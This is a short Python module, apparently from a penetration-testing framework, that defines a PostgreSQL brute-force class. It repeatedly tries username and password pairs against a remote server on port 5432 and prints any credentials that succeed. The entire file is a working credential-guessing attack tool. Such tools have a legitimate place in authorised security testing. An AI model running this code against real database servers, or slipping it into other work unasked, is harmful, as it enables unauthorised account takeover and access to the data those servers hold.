import aiopg
import psycopg2

from modules.brute_force.bruteforce_login import AsyncBruteForceLogin, StopError


class PostgreSQLBruteForce(AsyncBruteForceLogin):

    def __init__(self):
        super().__init__("postgre_bruteforce",
                         ["postgre", "sql", "brute", "force", "bruteforce"],
                         "brute force postgresql server",
                         port=5432)

    async def login(self, username: str, password: str):
        try:
            await aiopg.connect(host=self.rhost,
                                port=self.rport,
                                timeout=self.timeout,
                                user=username,
                                password=password)
            print(f"[+] password found: {username}:{password}")

            if self.stop_on_success:
                raise StopError
            return True
        except psycopg2.Error:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")
        return False
